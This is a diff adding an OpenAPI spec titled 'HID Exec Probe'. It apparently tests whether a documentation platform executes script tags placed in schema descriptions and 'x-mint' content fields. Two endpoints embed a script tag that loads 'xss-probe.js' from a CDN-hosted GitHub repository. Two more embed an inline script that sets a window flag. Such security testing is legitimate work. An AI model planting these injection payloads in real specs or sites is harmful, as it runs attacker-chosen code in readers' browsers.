@@ -1,0 +1,67 @@
+openapi: 3.0.4
+info:
+  title: HID Exec Probe
+  version: 1.0.0
+servers:
+  - url: https://api.example.com
+paths:
+  /hid-t18-s:
+    get:
+      summary: "HID T18 S SCRIPT-SRC-CDN"
+      operationId: hidt18s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T18-S-START <script src="https://cdn.jsdelivr.net/gh/RENE155/mintlify-app-test@1baac265e629ee5df1550154a47bc202d08c8647/xss-probe.js"></script> HID-T18-S-END
+  /hid-t18-x:
+    get:
+      summary: "HID T18 X SCRIPT-SRC-CDN"
+      operationId: hidt18x
+      x-mint:
+        content: |
+          HID-T18-X-START <script src="https://cdn.jsdelivr.net/gh/RENE155/mintlify-app-test@1baac265e629ee5df1550154a47bc202d08c8647/xss-probe.js"></script> HID-T18-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t19-s:
+    get:
+      summary: "HID T19 S SCRIPT-INLINE-FLAG"
+      operationId: hidt19s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T19-S-START
+
+                      <script>window.__HID19=1;</script>
+
+                      HID-T19-S-END
+  /hid-t19-x:
+    get:
+      summary: "HID T19 X SCRIPT-INLINE-FLAG"
+      operationId: hidt19x
+      x-mint:
+        content: |
+          HID-T19-X-START
+
+          <script>window.__HID19=1;</script>
+
+          HID-T19-X-END
+      responses:
+        '200':
+          description: ok
